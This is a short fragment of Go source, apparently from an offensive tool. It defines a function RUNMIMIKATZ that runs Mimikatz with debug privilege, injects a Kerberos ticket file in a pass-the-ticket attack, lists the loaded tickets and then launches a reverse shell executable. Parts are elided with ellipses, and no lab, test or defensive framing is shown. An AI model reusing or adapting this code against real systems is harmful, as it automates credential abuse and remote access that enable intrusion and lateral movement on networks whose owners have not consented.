...
func RUNMIMIKATZ() {
	...
	mimikatzOut, err := exec.Command(MimikatzFullPath, "privilege::debug", "kerberos::ptt \"TICKETFILENAME\"", "kerberos::list", "exit").Output()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(mimikatzOut))
	revShell := exec.Command(ReverseShellFullPath)
	err = revShell.Start()
	if err != nil {
		fmt.Printf("%s\n", err)
	}
